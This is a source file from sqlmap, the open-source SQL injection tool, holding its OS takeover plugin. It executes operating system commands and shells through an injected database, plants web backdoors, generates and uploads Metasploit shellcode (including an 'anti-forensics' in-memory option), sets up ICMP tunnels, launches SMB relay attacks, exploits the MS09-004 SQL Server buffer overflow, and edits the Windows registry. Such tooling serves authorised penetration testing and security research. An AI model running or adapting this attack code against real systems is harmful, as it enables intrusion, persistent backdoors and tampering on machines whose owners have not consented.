#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

from plugins.generic.misc import Miscellaneous

class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = "sqlmapoutput"
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "going to use a web backdoor for command execution"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "unable to execute operating system commands via "
            errMsg += "the back-end DBMS"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "going to use a web backdoor for command prompt"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "unable to prompt for an interactive operating "
            errMsg += "system shell via the back-end DBMS because "
            errMsg += "stacked queries SQL injection is not supported"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = "how do you want to establish the tunnel?"
            msg += "\n[1] TCP: Metasploit Framework (default)"
            msg += "\n[2] ICMP: icmpsh - ICMP tunneling"

            while True:
                tunnel = readInput(msg, default='1')

                if tunnel.isdigit() and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = "invalid value, valid values are '1' and '2'"
                    logger.warn(warnMsg)
        else:
            tunnel = 1

            debugMsg = "the tunnel can be established only via TCP when "
            debugMsg += "the back-end DBMS is not Windows"
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = "you need to run sqlmap as an administrator "
                errMsg += "if you want to establish an out-of-band ICMP "
                errMsg += "tunnel because icmpsh uses raw sockets to "
                errMsg += "sniff and craft ICMP packets"
                raise SqlmapMissingPrivileges(errMsg)

            try:
                from impacket import ImpactDecoder
                from impacket import ImpactPacket
            except ImportError:
                errMsg = "sqlmap requires 'python-impacket' third-party library "
                errMsg += "in order to run icmpsh master. You can get it at "
                errMsg += "http://code.google.com/p/impacket/downloads/list"
                raise SqlmapMissingDependence(errMsg)

            sysIgnoreIcmp = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(sysIgnoreIcmp):
                fp = open(sysIgnoreIcmp, "wb")
                fp.write("1")
                fp.close()
            else:
                errMsg = "you need to disable ICMP replies by your machine "
                errMsg += "system-wide. For example run on Linux/Unix:\n"
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += "If you miss doing that, you will receive "
                errMsg += "information from the database server and it "
                errMsg += "is unlikely to receive commands sent from you"
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = "how do you want to execute the Metasploit shellcode "
                    msg += "on the back-end database underlying operating system?"
                    msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
                    msg += "\n[2] Via shellcodeexec (file system way, preferred on 64-bit systems)"

                    while True:
                        choice = readInput(msg, default='1')

                        if choice.isdigit() and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = "invalid value, valid values are '1' and '2'"
                            logger.warn(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = "unable to mount the operating system takeover"
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = "by default MySQL on Windows runs as SYSTEM "
                    debugMsg += "user, no need to privilege escalate"
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = "unable to mount the operating system takeover"
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = "falling back to web backdoor to establish the tunnel"
            else:
                infoMsg = "going to use a web backdoor to establish the tunnel"
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg = "sqlmap does not implement any operating system "
                    warnMsg += "user privilege escalation technique when the "
                    warnMsg += "back-end DBMS underlying system is not Windows"
                    logger.warn(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = "unable to mount the operating system takeover"
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = "unable to mount the operating system takeover"
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = "unable to prompt for an out-of-band session"
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows: it is not possible to perform the SMB "
            errMsg += "relay attack"
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = "on this back-end DBMS it is only possible to "
                errMsg += "perform the SMB relay attack if stacked "
                errMsg += "queries are supported"
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "since stacked queries are not supported, "
                debugMsg += "sqlmap is going to perform the SMB relay "
                debugMsg += "attack via inference blind SQL injection"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = "it is unlikely that this attack will be successful "

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += "because by default MySQL on Windows runs as "
            warnMsg += "Local System which is not a real user, it does "
            warnMsg += "not send the NTLM session hash when connecting to "
            warnMsg += "a SMB service"

        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += "because by default PostgreSQL on Windows runs "
            warnMsg += "as postgres user which is a real user of the "
            warnMsg += "system, but not within the Administrators group"

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += "because often Microsoft SQL Server %s " % Backend.getVersion()
            warnMsg += "runs as Network Service which is not a real user, "
            warnMsg += "it does not send the NTLM session hash when "
            warnMsg += "connecting to a SMB service"

        else:
            printWarn = False

        if printWarn:
            logger.warn(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = "the back-end DBMS must be Microsoft SQL Server "
            errMsg += "2000 or 2005 to be able to exploit the heap-based "
            errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
            errMsg += "stored procedure (MS09-004)"
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = "going to exploit the Microsoft SQL Server %s " % Backend.getVersion()
        infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
        infoMsg += "buffer overflow (MS09-004)"
        logger.info(infoMsg)

        msg = "this technique is likely to DoS the DBMS process, are you "
        msg += "sure that you want to carry with the exploit? [y/N] "

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = "'uncPathRequest' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "the back-end DBMS underlying operating system is "
            errMsg += "not Windows"
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = "which registry key do you want to read? [%s] " % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = "which registry key value do you want to read? [%s] " % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "reading Windows registry path '%s\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg = "which registry key do you want to write? "
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "which registry key value do you want to write? "
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = "which registry key value data do you want to write? "
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = "which registry key value data-type is it? "
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = "adding Windows registry path '%s\%s' " % (regKey, regVal)
        infoMsg += "with data '%s'. " % regData
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = "missing mandatory option"

        if not conf.regKey:
            msg = "which registry key do you want to delete? "
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "which registry key value do you want to delete? "
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = "are you sure that you want to delete the Windows "
        message += "registry path '%s\%s? [y/N] " % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = "deleting Windows registry path '%s\%s'. " % (regKey, regVal)
        infoMsg += "This will work only if the user running the database "
        infoMsg += "process has privileges to modify the Windows registry."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
